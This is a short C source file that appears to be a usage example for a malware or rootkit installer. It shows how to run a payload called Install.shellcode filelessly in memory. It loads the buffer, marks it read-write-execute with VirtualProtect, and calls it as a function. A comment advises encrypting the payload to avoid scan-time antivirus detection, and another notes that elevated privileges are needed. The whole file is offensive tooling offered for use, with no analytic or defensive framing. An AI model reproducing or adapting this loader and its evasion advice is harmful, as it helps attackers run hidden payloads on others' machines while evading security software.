#include <Windows.h>

// Example on how to use Install.shellcode

// Install.shellcode wraps up Install.exe in a way that it can be loaded and executed as shellcode.

int main()
{
	// --- Elevated privileges required ---

	// 1. Load Install.shellcode from resources or from a BYTE[]
	// Ideally, encrypt the file and decrypt it here to avoid scantime detection.
	LPBYTE shellCode = ...

	// 2. Make the shellcode RWX.
	DWORD oldProtect;
	VirtualProtect(shellCode, shellCodeSize, PAGE_EXECUTE_READWRITE, &oldProtect);

	// 3. Cast the buffer to a function pointer and execute it.
	((void(*)())shellCode)();

	// This is the fileless equivalent to executing Install.exe.

	return 0;
}